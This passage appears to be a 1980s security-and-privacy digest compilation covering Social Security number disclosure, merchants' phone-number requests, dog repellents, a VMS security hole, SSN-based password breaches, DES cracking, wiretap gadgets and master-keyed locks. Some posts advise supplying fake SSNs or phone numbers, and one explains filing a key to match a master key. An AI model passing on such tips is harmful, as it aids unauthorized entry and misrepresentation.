that time.  Now I sometimes run into the consequences of that action.

The University of New Mexico 'requires' your Social Security Number whenever
you enroll in classes.  If you are a foreign national, the University will
assign you a number; if you are a US Citizen, they will not.  I was not able
to test this because I had previously given them my SSN.  However, we got all
my records marked such that the University won't give out my SSN without a
court order.

  4) Should I bother to follow-up on this further?  That is, should
  I bother contacting the Public Service commission in Indiana
  about the treatment I received? (I'm currently not sure it is
  worth the effort).

The telephone companies have had their own way for so long that it is nice
to finally see that turning around.  You seem to think highly of Southern
Belle  while you express surprise that they had information about you that
you had never given them and that you think they didn't need.  The Privacy
Act of 1974 covers only the government and its subcontractors.  Currently,
private companies can require whatever information they think their customers
will provide.  You may argue that Southern Belle is a subcontractor and you
would be correct, but most people don't believe that your little problem
applies to their great big company.

From "The Report of The Privacy Protection Study Commission" a booklet known
as appendix 4, "The Privacy Act of 1974: an Assessment" page 3.

=============================================================================
	Government contractors are another category of entities to which the
Privacy Act applies.  Subsection 3(m) of the Act provides that:

	When an agency provides by contract for the operation by or on
	behalf of the agency of a system of records to accomplish an agency
	function, the agency shall, consistent with its authority, cause the
	requirements of . . . [the Act] to be applied to such system.  For
	purposes of subsection (i) [the criminal penalties provision] of [the
	Act] any such contractor and any employee of such contractor, if
	such contract is agreed to on or after the effective date of [the Act],
	shall be considered to be an employee of an agency.  [5 U.S.C.
	552a(m)]
=============================================================================
ibid.,pp.35

	The Privacy Act also establishes criminal penalties for certain knowing
and willful violations of its requirements.  Subsection 3(i) provides that an
officer or employee of an agency may be found guilty of a misdemeanor and
fined up to $5,000 for knowingly and willfully disclosing individually
identifiable information, the disclosure of which is prohibited by the Act or
agency regulations thereunder, or for willfully failing to publish an annual
"Federal Register" notice on a system of records.  The same penalties may also
be assessed against anyone who knowingly and willfully requests or obtains
an agency record about an individual under false pretenses.
=============================================================================
ibid.,pp.5
		What is Covered by the Act

	Where the Act fails to meets (sic) its objectives, the failure can
often be  traced, in part, to the record and system-of-records
definitions that further limit its scope of application.  The Privacy
Act applies to a "record" that is "retrieved" from a "system of records"
by the name of an individual "or by some identifying number, symbol, or
other identifying particular" assigned to him. [5 U.S.C. 552a(a)(5)]
	As defined in subsection 3(a)(4), "record" means:

	. . . any item, collection, or grouping of information about an
	individual that is maintained by an agency, including, but not
	limited to, his education, financial transactions, medical history,
	and criminal or employment history and that contains his name, or
	the identifying number, symbol, or other identifying particular
	assigned to the individual, such as a finger or voice print or a
	photograph.[5 U.S.C. 552a(a)(4)]
=============================================================================
However...
ibid.

Thus, unless an agency, in fact, retrieves recorded information by reference
to a "name. . .identifying symbol, or other identifying particular. . .," the
system in which the information is maintained is not covered by the Act.
=============================================================================

You need to inform each "agency" what you consider "individual identifying
information".  You may then tell them that your
	1)  Name
	2)  Birthdate
	3)  Social Security Account Number (The one which identifies your
		retirement insurance payment information; and generally is of
		the form 123-45-6789...)
	4)  Street Address in conjunction with physical description
		information,
	5)  Phone Number in conjunction with physical description
		information,
are sufficiently private that they may not disclose these numbers without
your specific written authority, and that the "agency" must show you a log
of everyone who has had access to these "records".  If they cannot do this
before you give them the information, they are already in violation.  What
makes you think that they will clean up their act after you tell them your
"Retirement Account Number".

These Privacy Act reports state that the majority of the burden of
enforcement rests on the individual, and that the individual wasn't really
interested.  The Privacy Act was being observed as though it were a "good
idea at the time, but not really applicable to 'my agency's situation'".

A letter about Southern Belle's having "acquired" your SSN should probably
be directed to the Data Processing Manager explaining that he is liable for
a $5,000 fine and that he'd probably better "cut it out".

You did the proper thing to the "cracker" at Indiana Bell, but you should
send them a copy of what you send to Southern Belle, this note with an
explanation of what the 'Risks' group is, and a request for an apology and
notification that the above listed items are Privacy Act items.  You won't
be able to get a free unlisted phone that way, (I think, I really don't
know, but the book says that that information is in the public domain).  But
you can certainly stop the harrassment from the Service Representatives.

Subj:	[533]  giving out your phone number

Gene Spafford's note made me think about giving out phone numbers.  When
you use a credit card, store clerks always ask you to sign the receipt
and right down your phone number.  Sometimes they ask for your address.

Now, I don't normally like to give my phone number, even if it is listed
in the phone book.  So, I have always wondered, can they force you to give
out your phone number?

Well, just an instigation to perform violance.

To build an opinion about this way of writing a public message is left
to the reader.

However, as System/Security Manager I know very well those problems with
hackers (see below). In case of detecting such a penetrator, I grab him and
take further steps personally.
At my site no personal mail relative to those topics in Roy Omonds message
reached me. May be, that is not astonishing in the light of a message,
which is based on some vague informations.

Well, this comment fully deserves my agreement, because you will see, how well
written the Phone Patch is (of course, I mean the second, bugfixed version).
But, does it make sense, to examine software, distributed over the net, only
if there is someone, railing at the creator ?
I think, you allways should very carefully examing such software, performing
modifications of the operating system. If your are not able to do this, for
example, because you have no micro-fiches, it is reasonable to wait for such
modifications from DEC.
I did not add such a hint to my PHONEPAT - description, because I suppose, we
all think that way.

As I mentioned in my PHONEPAT message, there are many clever student users at
our site, detecting bugs or undocumented features in VMS. I spend a lot of
time in preventing them from successfully attacking the system. To do this
efficiently I made my thoughts about the things a hacker might perform.
Thus, I learned much, and hacked patches to parts of the system as a problem
of system security (again affecting my nerves and time) are old for me;
if they are new to you, dont accuse those people, making their experiences
with these aspects of security, but learn from them and be thankful !

     Subject:   Dogs, defense against

     I have heard about aerosol sprays that deter attackers, but can't find
     them and don't know if they are legal. Someone suggested to my wife
     that she buy a squirt gun with a 30-foot range and fill it with
     ammonia to shoot at dogs. Q: Would this work without getting me into a
     lawsuit from seriously injuring a dog?

Ammonia?  Sounds pretty nasty, and I would think it could hurt the dog.
I've always heard lemon juice is what you should use.

     And what is in aerosol sprays that are used for self defense, if
     not mace? What sprays are legal and where are they found?

Well, there is "PARALYZER", which is basically Army tear gas.  It comes
in a small black aerosol; most "army surplus" type stores sell them,
among other places.  I'm not sure what a dog would do if you sprayed
him with it though; the stuff is NASTY.

     I'm not a dog hater. I've never been a dog owner, either. Does
     anyone have any better suggestions?

Most of the postal carriers here have some sort of small aerosol
clipped to their mail bags; I assume it is for discouraging dogs.  You
might call your local post office and ask them what they recommend.

Subj:	[1674]  Personal protection from Dogs

I'm assuming this is related to the net.  R. Morey inquired about things
to protect people from less than freindly dogs.  There are a number of
such products available, tho' I'm not sure of the sources.

     1.  STOP! is an aerosol designed for protection specifically
     from dogs.  Aimed at their snouts, it will stop them in their
     tracks without doing permanent harm.  A bicycling friend of
     mine swears by it.

     2.  DAZER is a new electronic device that generates high
     frequency sound painful to dogs.  A recent Syracuse, NY
     newspaper article described tests as ambiguous - when it
     worked it worked very well.
    
     3.  The originally mentioned ammonia squirt gun trick is very
     effetive if you can hit the dog.

Regarding liability for hurting dogs:  I'm not a lawyer, but in nearly
every community, some form of leash laws exist.  Even when they don't,
a pet owner is responsible for his/her pets actions.  If they leave the
confines of the owners property, you are justified in using reasonable
means, including physical harm if truly necessary, to protect the health
and safety of yourself and your family.  I personally wouldn't hesistate
to take action against a dangerous animal if it threatened me, my wife,
or my children.  I would also be glad to answer any pet owners complaints
about my treatment of their animal.  By the way, I have a large dog and
two cats of my own - I'm NOT an animal hater.

There are two kinds of spray dog repellants I know of, one's mace (CN
or CS gas) and the other's just something nasty billed as a dog repellant.
Generally either one will repel an attacker, man or dog. But if you run into
a really mean dog or really mean (or drugged) human it will just make
them mad.
I've spent a lot of time biking in the mountains in western mass and NY
and have had problems with dogs. I got a can of mace (CN I think, it was
illegal - tear gas), next dog I ran into I leveled the can at him and he
ran for cover before I had a chance to douse him. I haven't carried a can
since, all the dogs I've run into KNOW, they've been maced before.
Unless the dogs are an extra ornery junkyard type mace, CS, CN or dog
repellant will teach them quickly to stay away.
(good luck finding the stuff, I believe it's illegal many places - my
grandmother got some from her mailman once [for use on dogs])

German hackers has successfully attacked the NASA and will reveal that
tomorrow (tuesday, sept. 15) in the German news magazine 'Panorama',
which will usually be seen by 10 - 12 million people. Newspaper articles
by dpa (German news agency) will appear simultaneously.

  Hackers wonder why the doors of NASA are still wide open. In his
"important message" Roy Omond (DHDEMBL5) speaks of a magical password.
Perhaps it is the same still now.

  This is the third warning to the NASA (the first two were sent via
SPAN-net). I wonder, why the NASA neither answers nor react.

  Other systems are also open, because they implemented the Troian Horse
via their backups after having installed the mandatory update by DEC to
patch the former security hole.

Seems simple enough to me. The crystals in those handy-dandy garage door
openers are *usually* (if they arent...just de-solder em..) plugged into
a socket somewhere in the controller.  Just mount the two crystals somewhere
else and wire them thru a DPDT (Double Pole Double Throw) switch from Radio
Shack and wire the switch into the now empty socket from the crystals.
Stick it in the car with some double stick mounting tape, and label the
switch Left/Right or 1/2 or 0/1 (whatever suits your fancy...) and then
hit the button.  When it's on "1" door "1" opens, and when on "0", door "0"
opens....no biggie.  And if there is such an "off the shelf" (i.e. Unhackerish)
type available, it probably is part of a so-called "system" and costs giga-
bucks!...

Hope this helps....

Subj:	[906]  ssn's

MIT, in a noncharacteristic burst of liberal generosity (or they're
tired of getting kicked in the *** by people who demand their rights),
gives you the option of having your ssn or a pseudo ssn which they
provide as your MIT ID number.  The pseudo ssn's all begin with 888,
as (so goes the story) there have not (yet) been any real ssn's
issued with that prefix.

If it is true that no 888 numbers have been issued (please reply if
you think otherwise and have counterexamples), then giving some random
888 number as your ssn could be an easy solution for people who wanted
to hide theirs and avoid hassle (though be careful about
misrepresenting yourself on signed legal documents).

Unfortunately, it is too late for me, as my ssn is plastered all over
everything.  Oh well,

Subj:	[824]  re: garage door openers

sure, you can do that .. but not by changing the frequencies.

Some of the new garage door openers send a digital code (typically 8 bits)
as part of their signal.  The door opener and the controller have to
be set to the same code for it to work.

All you need is two openers (same brand and model) and one controller.  
To change codes on my controller, their are some jumper cables that you
cut to set the bits.  Wire a switch up to one of the jumper cables.  
Set the codes in the door openers so they only differ by one bit (the
one with the switch).  Now the switch allows you to send two different
codes, one for each door.

There used to be a product called "Halt!", sold at bicycle stores, that
was *quite* effective at stopping charging dogs in their tracks.
However, I have no idea what would happen when it wears off, as I was
always long gone by that time -- maybe you would simply have a very angry
dog on your hands...

Halt! is more-or-less aerosol Tabasco Sauce, and does not cause any harm
to the dog; ammonia, on the other hand, can cause blindness if you get it
in the dog's eyes.  I don't know if Halt! is still available, but I assume
that it is -- check out your local bike shop.

Subj:	[660]  giving out phone numbers

Hmmm, watching all the discussion about social security numbers, I am
curious about two things in regards to phone numbers.

When I use my credit card retailers invariably ask for a phone number
under your signature, and worse insist on it.  Generally I just give
them a random number.  (I even used 999-123-4567 once, and nobody
noticed.)

First, can a retailer insist on a phone number?

Second, am I in trouble for giving out wrong numbers?

And just to go a step further, what about when they ask for your address?

My understanding is that in about 1979 or so, Congress made an
explicit exception to the Privacy Act of 1974 to explicitly
permit states to use SSN's for all forms of motor vehicle
registration, including both your driver's license and the
registration of your car.  This means, of course, that the
original Privacy Act really does not mean anything any more because
your driver's licence is such a ubiquitous ID that once there,
it is available to all the world.

Write your congressman.  Existing law is *not* on your side.  I fear I
am cynical, but I have lost several times  -- after fighting hard and
even hiring lawyers.  Present law favors, encourages, and often
requires the use and disclosure of SSN's.  The somewhat limited
provisions restricting SSN's that were present in the Privacy Act of
1974 have been emasculated by subsequent legislation.

In Alaska, they appear to have a more enlightened approach to Social Security
numbers.  When I renewed my drivers license a couple of years back, I told them
to remove it.  The clerk didn't know how to do it, but the supervisor was very
helpful.  My license now shows 000-00-0000 in the SS # location.
  My other experience with this was at Arizona State University, where
they use it for a student ID number.  I refused to give it, and they were happy
to issue me a 998-xx-xxxx number.  Their forms call it a 'student ID #'
  The University of Alaska is pretty insistant on getting the actual number,
however.  Their forms have the gall to always call it a 'SS #'

According to Social Security Administration Publication No. 05-10001 (Sept 86)

  DISCLOSING YOUR SOCIAL SECURITY NUMBER
    "Any Federal, State or local agency that asks for your Social Security
     number must tell you whether giving it is mandatory or voluntary,
     under what authority the number is being requested, and what uses will
     be made of it.

     Some non-governmental organizations also use Social Security numbers
     for recordkeeping purposes.  Such use is neither required nor
     prohibited by Federal law.  Although you are not required to give
     you number, the organization is not required to provide you service
     if you do not.  Knowing your number does not allow these organizations
     to get information from your Social Security record."

TWIMC:

	It's beginning to appear that my master's project at Columbia
will be on abuse of social security numbers.

	Here's my first story:

John Stein (not his real name) teaches writing and performs technical
consulting at Columbia University. He is married, has two children, a
house in New Jersey, and a six-figure income.

Two years ago, John and his wife went to Hawaii for his semester long
sabatical. Because of his income, John is required by law to file
estimated income tax payments every semester. Naturally, John filed
these payments from Hawaii.

When he returned to New Jersey, he found that some of his mail had not
been forwarded while he was on vacation. Among these was a notice from
the IRS saying that they had not received his estimated tax payments
and that a lean had been placed on his house for the overdue taxes. 

Now, by this point John had the cancled checks. It took over two
months of working with the IRS to find out what had happened: The
taxes had been mailed from Hawaii, and the Post Office had delivered
the checks to the IRS's branch office in California rather than in
New York. This was the year that the IRS had all of its computer screw
up problems, so the tapes from California were never run against the
tapes from New York, an the credit was never picked up. Once this was
all traced down, the IRS removed the lean on the house.

Nothing happens for two years, until John applies for a loan and has
it rejected by the bank because he is a credit risk. Aparently, in the
TRW credit database, which is indexed by SSN, there is a statement
saying "123-45-6789 (not his real SSN): Lean removed from house.
<year>". The bank would not give a loan to somebody who had a lean on
his house.

John contacted the bank, provided documentation from the IRS that the
lean had been placed in error, and eventually, after a lot of hassle,
got his loan approved. 

The next year, when he tried to get a Sears Discovery card, the same
thing happened again.

This time, he sent a copy of all the documentation to the TRW credit
database, asking them to remove the "lean removed" statement from
their records. They didn't. Instead, they added to their records that
the lean had been issued by the IRS, and that the IRS later said that
the lean had been issued in error.

Rather than face continued hassles, John has decided to work with his
current bank for all future credit transactions. Unfortunately, he has
to do this for the rest of his life.

I am certainly the most naive on this discussion group.

What is the big deal about giving out your SSN??  Has anyone actually been
harmed by giving out the number?  I sense that there is really something
that I am missing, buit this won't be the first time.

I'm sorry, but I really can't get worked up over giving out 9 numbers which
represent who I am no less than my signature (when legible) does.

Is this a practical point or a philosophical one?

	Social Security Administration -- Inside Scoop

From: lance@ubvax.UUCP (Lance Keigwin)

Just after college I accepted a job with the Social Security Admin (SSA)
in a NYC district office.  I spent several years with SSA as a claims
representative, operations supervisor, and regional program specialist.
Fortunately I had the good sense to leave several years ago, when it
became very clear that federal service was not an alternative to anything.

In these jobs I dealt with all levels of the SS program.  Undoubtedly the
two biggest headaches for SSA (and the public claimants) were resolving
discrepancies in dates of birth and earnings records.  Screwups in
establishing age is another story, and far less controversial.  SSA's
record there is really pretty good, if the claims rep is not a dope.

But scrambled earnings records are almost impossible to fix.  This
usually happens when somehow an employer gets a hold of a wrong number,
usually from an employee (although the employer could pick it up from
almost anywhere...and they do!).  Of course there is cross-checking
against what SSA believes is the right name and number but all it takes
is some (#$%@$%) clerk to cross refer two numbers to the same person and
zap!  Suddenly you're record relects someone else's wages too.  Or worse:
your covered earnings are credited to some third party.  This happens all
the time because people forget their numbers, re-apply for a second one,
guess wrong, etc.  Safeguards exist but if you consider the scale here
(all those workers, all those employers, and the general interest of the
average gov't employee in doing the job right even if it means more work
and worsened processing statistics) there are bound to be major problems.

When does the error come to light to you, John Q. Public?  If at all,
almost always at retirement, some decades in the future; at a time when
many employer records are gone, if not the employer itself, and your
recollection is at best fuzzy.  Chances are probably 9 in 10 that you'll
never get credit for all the taxes you paid, if your record is messed up
obviously enough for a rep to notice it and to look into it.

My advice:

1) Never, NEVER give anyone a fake SSN.  It will haunt you later in life.
If SSA has to search for earnings under a different number (spotted on an
application for employment, a credit card report, school record, etc.) you
will suffer significant delays in getting your correct benefit at best.
More likely, you will never live to see the tax credit.

2) Always, ALWAYS request a statement of your earnings every three
years.  There are screwy statute of limitations regulations (3 years,
3 months and 15 days), about when an error can be corrected.  Also the
statement of earnings you get will only breakout the last several years
individually, and will total all prior years in one lump sum, so it it
good to do it periodically.

3) If you suspect an error, ask for a complete posting of each year
(a "certified earnings record").  If you're given a little card to
complete and told it will be mailed to you, don't buy it!  You can only
get a complete record by seeing a Service or Claims representative, who
must complete an SSA-450 for transmission to HQ in Baltimore.  Insist on
a photocopy of it when it arrives.  Be troublesome, if necessary.

4) If you do see an error, put your dispute in writing and if you must
mail it in, do so certified mail.  Establishing the date you first
suspected an error is important.  SSA has ways of "scouting" an employer's
records.  Ask to have it done.

5) Check your W-2 for the correct SSN.  Paystubs too, but especially
the W-2.  Report any error to your employer and IRS.

6) If you don't want to give your correct SSN to someone and feel you
must fake it, give them a number that starts with "9".  There is no
such thing as a real 900-series number so you are not risking screwing
up yours or someone else's account.  SSA will never accept it.

7) If you get an official decision that goes against you, protest if
you really believe you're being cheated.  There are several appellate
steps, and usually the official who decides is reasonably intelligent
and responsible.  Read the back of the notice about "reconsiderations",
"hearings", etc.  The reversal rate it very high.

As a matter of interest, two years after I started work for SSA I
requested a record of my earnings.  Sure enough, there was an error in
two quarters.  Want to guess who the employer was that messed up?
Yep, SSA.  It took them 3 years to fix it.  Good thing I had an "in". :-)

I also discovered that my retired father should have been getting benefits
for three of his student children (an SSA snafu).  I had us apply, and
asked for full retroactivity (over 8 years).  The claims examiner awarded
only 12 months of retroactivity.  I appealed.  We won.  Total family
benefits came to over $7000.  I used my $1500 to buy a washer and dryer.

Drugs and DES:  A New Connection

From "Logged On", by Vin McLellan - Digital Review, August 24, 1987, page 87

Anthony Prince Fairchild is doubtless a colorful rogue.  Five years ago, when
People magazine reported on a dispute between the Aspen sheriff and the Drug
Enforcement Administration (DEA) about lax law enforcement in the Colorado
resort town, Fairchild stepped forth - not to deny the DEA's allegations that
he was running an Aspen "drug factory," but, rather, to defend eccentricity.

"It's not against the law to be bizarre," he told People, which featured a
photograph of him leaning back against a nude female mannequin he called
Christina.

Some may have found Farichild's face familiar.  An engineer by education and
trade, Fairchild had also been a model:  His Salem-smoking visage has adorned
millions of magazines and billboards.  He's now 50 years old, but police still
call him a "pretty boy."

Last month at a pre-trial hearing in San Jose, Calif., Fairchild curled up on
a courthouse bench reading Firestarter, while the curious strolled by to check
him out.  After all, Fairchild had just had his bail changed from $2.5 million
to "no bail" out of fear that he would post the money and disappear.  "He
looks just like Timothy Leary," said an onlooker, referring to the LSD guru
the '60s.

If Fairchild isn't a legend like Leary, it may be because federal authorities
have never publicized the extent of their interest in him, even though they've
sought him several times over the years.

But after being arrested last November with eight kilos of cocaine, $12,000 in
counterfeit money and 85 pounds of high explosives, Fairchild became a topic
of rumor in Silicon Valley, in the California drug culture and, oddly enough,
among the nation's top security consultants as well.

"The guy's got a brain," remarked one California investigator.  "You maybe
couldn't guess it to see the mess he's in, but he's done a lot of things -
legit things - and some say he's just slightly short of being absolutely
brilliant."

Fairchild's resume indicates success in a half-dozen careers, most recently as
an EDP consultant in Silicon Valley.  It claims he holds 11 U.S. patents, and
states that he was one of the authors of Digital Research's Concurrent PC-DOS.
The police say this work record is accurate.

Predictably, Silicon Valley police have been among the first to confront the
probleme of criminal enterprises that digitally encrypt incriminating records.

"There's one case like that every six weeks around here," noted a local police
reporter.  "It's become quite common."  The method of choice is, of course,
the Digital Encryption Standard (DES), the cipher approved by the U.S.
government for commercial data security.

Fairchild used a Winterhalter DES board in a DOS micro to keep what police
believe to be an extensive diary of the affairs of a "large international drug
ring."  Local, state and federal narcotics agents are all very eager to gain
access to Fairchild's records.  Indeed, Santa Clara, Calif., police reportedly
used covert FBI funds to have a privately owned supercomputer grind away at
cracking the DES-encrypted data.

The attempt was not a big secret.  Several EDP security consultants were
asked to suggest crypto attacks.  What made the DES attack feasible, if
still unlikely to succeed, was that the Winterhalter device uses a program
to transform a 6-to-16-character password into the 64-bit DES key.

The cops got lucky:  With a pass through a full English dictionary, and by
culling significant names and such from Fairchild's personal history, they
were apparently able to guess three of four passwords that were used to
encrypt files stored on his micro.

The passwords were all eight or fewer characters in length, and all in
lowercase letters.  The diary file continued to elude their efforts, but
the police reasoned that if the DES password for the diary was less than
eight characters, a "brute force" approach to finding it was possible.  A
cryptoanalyst who is a leading consultant for California banks was hired to
make the attempt.

The supercomputer may have actually been chewing away when the Justice
Department stepped in late last month to confiscate copies of the encrypted
diary, presumably as evidence in a federal drug case against Fairchild.  This
pre-empted local authorities from possibly making the big score.

Subj:	[1438]  Garage door openers, etc

I have seen garage door openers made for two doors, for split 2-door garages.
I do not, however, think this is the forum to discuss them in.

  We have had a security breach here, on our VAX 8800 which is related to
Social Security Numbers.  We use the SS # as an account ID, and as the
initial password for users.  No, this was NOT my decision, and I do not
like the concept, but I do like working here, so that's enough about that.
  We had a user using the WHO program who was looking up random SS #s until
he found a hit, then he tried it to see if it was the password to the account.
This wouldn't be so bad, since the system forces first-time users to change
their passwords, except that this is the beginning of the academic year and
there are a lot of new accounts arouund which haven't been logged on to.
  Needless to say, he caused a lot of trouble by sending troublesome mail
messages to users, and generally wreaking havoc.  Our response has been to
disable each account he uses, one by one, but since he appears to be a dialup
user in another city, (Our network spans 1100 by 1400 miles), there is not a
whole lot we can do to him.  We did correct the backdoor in WHO, though, so
as to prevent another occurance of this type.
  Just one more reason to stay away from using SS #s!

  Social Security numbers are a very volatile subject.  I think the subject
has been covered well in this digest.  Most government agencies withhold
their policy on SS #s simply because it is much more convenient for them
when people provide them.  There are very few government agencies which
absolutely require that you disclose your number, however.  Private companies
are a different matter, however.  They can refuse service if you don't meet
their requirements, whatever they may be.
  As for changing all of this, it probably is too late in the game.  Those of
us who feel strongly enough to protest will be noticed, but face it, the
average person is going to take the path of least resistance.  There will
always be more than enough people who quietly go along with it to offset
those of us who resist.

  I don't know if they can force you to give your phone number or for

asked to give them my phone number or address I give them an address
in a fake town (Tulga, Fl) and a fake phone number (813-622-1212)
which happens to be the number for time.  It's easier to lie about it
than argue with the clerk.  
  I believe though they can refuse to let you use your credit card
without it though.  Just like they do not have to take checks. An
interesting idea though is stores' refusal to take 50 and 100 bills.  I
went to McDonald's the other day and tried to pay with a $50 bill but
they demanded identification.  I refused, said to them "take it or
give me the food for free".  They still refused, I took the food and
sat down to eat.  The manager came and said he would call the police
if I did not pay for the food, I said, I offered to pay and you refused
to take it.  After I pointed at that a $50 bill is legal tender and is
against the law to refuse to take it he finally relented and allowed
the cashier to take the money.

This is a very stupid practice which seems to occur only in the USA

Of course, I could give them anything-- an IRS office, the White

gladly, and I know they would never call it.

   They don't check this number as part of verification.  In restaurants,

   wonder what they do with this info.  It might help someone who's

I regularly leave my work phone or a string of seven random digits
(sometimes I mentally spaz and leave my phone number from two years and
2000 miles away...). I used to get the story that this number was
requested to handle cases where the purchase was under the floor limit,
so if something later went wrong with the charge (when they finally got
around to entering it), they could get in touch with you.

However, everyone (at least in the SF Bay Area) now routinely has
magstripe readers attached to phone lines, and they all seem to get
phone approvals on every purchase, so I don't know why the hell they
still want my phone number. Sometimes I get ornery and say I don't have
one, or that it's unlisted, and this causes them utter confusion. Great
fun, if you're in the right frame of mind.

I think it's just force of habit these days, combined with a submissive public.

In reply to Brint Cooper's <abc@brl.arpa> notion of providing a false
SSN number, this would not work here in Canada (nor probably the US
either) since the SIN (our local equivalent to SSN) uses a check digit
which can be verified readily by hand.  Now, whether the clerk you
are working with happens to know the appropriate formula or not......

As for the telephone numbers with credit cards, while working for
Bank of Montreal Mastercard in Vancouver several years back, this extra
information is also not required.  It seems to be the merchants' personal
way of gathering a little extra information should they be stuck with
a bum (ie. fraudulent) purchase.  As an example, they are actually required,
(not supposed, required) by their merchant's agreement with the Banking
institution, to check each and every purchase made with their copy of
the 'hot' sheet. But, since they think it is a waste of time, a simple
phone number usually will do.  (Have you ever actually supplied the
wrong number?)  In this particular instance, refusing the extra
information is only the first step.  Next, you could ask to see where
it is stated in their merchant's agreement (good luck trying to find
their copy - besides it's not written in your cardholder's agreement,
is it?)  Lastly, make a complaint to the Banking institution issuing
the card as all merchant agreements are negociated on an individual
merchant basis.  Besides, they have much more clout with this crummy
individual and will, undoubtedly, want to keep someone with such an
outstanding credit rating as yourself.  Right?  :->

Just swapping crystals with a DPDT switch isn't as easy as it sounds.
The wire from the crystal to the switch and from the switch to the holder
may cause unstable operation or even no oscillation. Also that means
you have to swap crystals in one of the garage door opener receivers.
If the change in frequency is any appreciable amount the receiver will
have to be retuned.
 An easier way to control two units with one remote is to get one
that has a digital code (settable internally by a dip switch).
Simply get two openers end set then one bit apart in digital code.
Then have the switch for that bit connected to an external switch on

I have heard many explanations for keeping a hidden ssn.  The most
important one, in my opinion, is that it is much easier to sort
records on a computer or in a paper filing system by a unique number,
rather than by name (since names are not unique).  If everyone uses
the same number to refer to you then a huge amount of information can
be gathered about you in a very short amount of time by someone with
either authority or connections saying to dozens of employers, credit
agencies, the IRS, the Registry of Motor Vehicles, the military, the
police, the FBI, insurance agencies, hospitals, the schools you have
been to, and practically any other organization with which you have
had dealings and which keeps records "Tell me everything you know
about 888-24-3315."

I don't like information about me to be that accessible.  Certainly it
is almost as easy to say, "Tell me everything you know about John
Wlodarczyk," which is one reason why many people don't hide their
numbers.

Other reasons include the moral position that people should not be
reduced to numbers in a machine (though I guess those people have
never heard of ASCII), and the legal position that the intent of a law
should not be broken (the Social Security Act of 1933 may have
loopholes, but as I understand it, the intent was clearly NOT to allow
the number it assigned to anyone to be used for any other purpose).

I saw an article a couple of years ago that mentioned capsicum

_not_ been legally authorized as "safe and effective" for use in
defensive sprays that are to be used against humans.  [From what I
remember of the article, CS and similar tear gasses have been tested
and found not to cause long-term injury to the eyes and respiratory
system;  capsicum oleoresin has not been tested in this way].  This
could, potentially, lead to the following unfortunate scenario:  you're
walking down the street, are approached by someone who make threatening
moves (but doesn't actually touch you), you zap him with Halt!, call
the police, and the alleged assailant files charges against you, for
assault with a caustic chemical.  You end up in jail.

I don't know of any case where this has actually happened, but the

That is hardly worthwhile.  What you have done MAY stop a true amateur, but
wire tapping can be cleanly done anywhere along your phone line.  There are
some interesting gadgets I saw at a convention which clamp onto any phone
line (outside or inside your house) WITHOUT need of a physical contact to the
wire itself and filter out the background clutter to send a clean FM signal
up to 1/4 mile away.  (This was a closed convention in '84 for security
types only; I happened to be consulting as a computer expert and needed to
find products that were amenable to computer monitoring.)  By the way, the
price for this goody at the time was around $350 - cheap by most standards -
and could be installed in 15 seconds.  The receiver (a bit more pricey) could
even filter out multiple signals (if it was clamped over two lines instead of
one), but required some manual work to keep it focused if both lines were in
use.

A more interesting gadget was an HP spectrum analyzer which was tied to a
computer and display as well as a nice IF antenna.  You got it.  ANYTHING
typed on the IBM-PC about 100ft away (for effect) appeared on the monitoring
display.  (Whoever said that emissions for PCs was small!)  The antenna was
directional, and for "kicks", the demonstrator turned it towards another
known PC in the auditorium.  We watched every character that the person
at the Vivitar security booth typed in!

I don't mean to pick on you, Paul, but the state-of-the-art is well beyond
your deterent. Unless you reinstall your phone lines with two ground coax (all
the way to the telephone pole) and get your PC TEMPEST equipped, the lock

Subj:	[711]  re: master keys

At least one way of setting up master keys is to use locks with 
pins that have multiple segments.

In a normal lock, each pin is split into two pieces. The key pushes each
pin up the amount necessary to line up the splits of all pins at the
boundry between the stationary and rotating points of the cylinder.

In one of these special locks, each pin is made of multiple segments, i.e.
there are two or more postitions in which each pin will allow the lock
to rotate.

My guess is that there are relatively safe ways to set up the keying, and
relatively unsafe ones.

Subj:	[3885]  Master keys

    It strikes me that most of the metal that my key is composed is
    only there to stop me opening other doors rather than to allow
    me to open my own! Does this mean that the key to my door is
    very much more simple than it looks?

Probably not.  If your door's lock mechanism is built along the usual
master-key lines, then it has as many pins as a non-master-keyed lock
of similar manufacture.  The pins, however, are designed somewhat
differently.

Familiar with the construction of a standard pin lock?  The top half
looks a bit like this, in cross-section:
 
	-------------------------------------
	|            @  @  @  @  @          |   @ = small spring
	|            @  @  @  @  @          |   # = upper half of pin
	|            #  #  #  #  #          |   % = lower half of pin
	|____________#__#__#__#__#__________|   _ = cylinder wall
	|            #  #  #  #  #          |
	|            #  #  #  %  #          |
	|            #  %  #  %  %          |
	|------------%--%--%--%--%----------|
                     %  %  %  %  %          |
  keyway ->          %  %  %  %  %          |
                     %  %  %  %  %          |
	|-----------------------------------|

When you insert your key in the keyway, it pushes the bottom halves
of the pins upwards, thus pushing the upper halves of the pins upwards
and compressing the springs.  If the notches on your key are each of
the correct height, then the pins will all come to rest with the
top-half/bottom-half line lying just at the cylinder wall.  This will
free the cylinder to rotate, and operate the bolt or latch.  If any
of the key notches is too high or too low, then the top-half/bottom-half
line on its corresponding pin will lie either above or below the cylinder
wall, and one of the two halves of the pin will prevent the cylinder
from rotating.

A master-keyed lock works in very much the same way, except that the
pins come in three parts, not two.  The cylinder will be able to turn
freely if each pin lies in either of two possible positions;  either
the top-section/middle-section line must lie at the cylinder wall,
or the middle-section/bottom-section must lie at the cylinder wall.

From your description (your key has more metal than the master key),
it sounds as if your key is designed to make the pins line up along
the middle-section/bottom-section line, and the master key lines them
up along the top-section/middle-section line.  This would indicate
that the (bottom-section length + middle-section length) for each
pin is the same for all of the locks on that particular master-key
system, but that the actual lengths of the bottom and middle sections
differ between the locks.

    Are these systems safe (It seems to me that taking a file to my key
    would allow it to open other doors!) enough?

Depends what you mean by "safe enough".  They're certainly less secure,
as there are obviously two different keys that can open the lock.  Worse
yet, there are probably even more than that: since each pin can be operated
in either of two different positions, there are 2^(#-of-pins) different
notch combinations that can operate the lock, out of M^(#-of-pins)
possible notch combinations (where M is the number of different depths
to which a notch can be cut).  I imagine that these locks might also be
a bit easier to pick than a non-master-keyed system.

and, yes, if you were to take an impression of the master key, and
simply file down your key until it matched, then you'd probably have
a key that would open your door and many others as well.

If you have material that you really want kept secure, I'd suggest locking
it up in a secure cabinet, using a difficult-to-pick padlock which
is not master-keyed and to which you have the only key(s).

Subj:	[1710]  locks

My adolescent curiosity got the best of me in high school on a similar
situation.  One day, I showed up early for a play rehearsal, and found
the door to the drama room locked.  Someone else was there and in
jest, I decided to try my keys to see if they'd work.  Lo and behold,
my home back-door key opened the door.  I then tried the rest of the
